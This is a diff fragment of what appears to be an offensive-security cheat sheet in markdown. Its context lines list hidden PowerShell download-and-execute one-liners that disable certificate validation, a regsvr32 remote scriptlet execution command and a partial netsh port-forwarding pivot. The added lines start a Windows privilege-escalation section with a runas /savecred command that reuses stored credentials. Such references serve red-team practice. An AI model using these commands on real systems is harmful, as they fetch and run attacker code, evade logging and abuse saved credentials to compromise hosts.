@@ -485,3 +485,10 @@ on the compromised host: `netsh interface portproxy add v4tov4 listenport=33389 
 Powershell: `powershell -w hidden -c "[System.Net.SystemPointManager]::ServerCertificateValidationCallback = { $true }; IEX ((new-object net.webclient).downloadstring('https://target/tools'))"`\
 PowerShell IWR: `powershell.exe –c “IEX (Invoke-WebRequest -SkipCertificateCheck -Method 'GET' -Uri 'https://target/tools')`\
 RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`\
+
+# Privesc
+
+
+
+## Windows
+Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
